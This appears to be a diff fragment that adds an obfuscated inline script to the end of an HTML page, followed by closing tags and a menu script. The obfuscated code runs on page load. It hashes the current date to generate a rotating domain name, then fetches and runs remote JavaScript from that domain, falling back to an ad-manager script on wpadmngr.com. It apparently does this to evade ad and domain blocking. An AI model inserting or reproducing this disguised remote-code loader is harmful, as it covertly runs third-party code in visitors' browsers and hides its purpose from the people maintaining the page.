+<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>
+	</div>
+<script async defer src="/js/menu.js"></script>
+</body>
+</html>
